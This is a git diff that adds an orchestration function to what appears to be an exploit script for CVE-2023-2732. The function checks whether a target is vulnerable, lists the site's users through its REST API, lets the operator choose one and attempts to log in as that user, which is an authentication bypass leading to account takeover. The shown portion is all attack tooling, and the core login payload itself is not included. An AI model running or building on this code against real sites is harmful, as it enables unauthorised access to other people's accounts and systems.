@@ -104,3 +104,20 @@ def attempt_login_as_user(target, user_id, username):
                 print(f"    {header}: {value}")
     except Exception as e:
         print(f"[•] Error during exploit attempt: {e}")
+
+def scan_cve_2023_2732(target):
+    if not version_check(target):
+        print("[•] Target is not vulnerable or version check failed.")
+        return
+
+    users = fetch_users_from_rest_api(target)
+    if not users:
+        print("[•] No users found or failed to retrieve user list.")
+        return
+
+    selected_user = prompt_user_selection(users)
+    if not selected_user:
+        print("[•] No valid user selected.")
+        return
+
+    attempt_login_as_user(target, selected_user['id'], selected_user['name'])
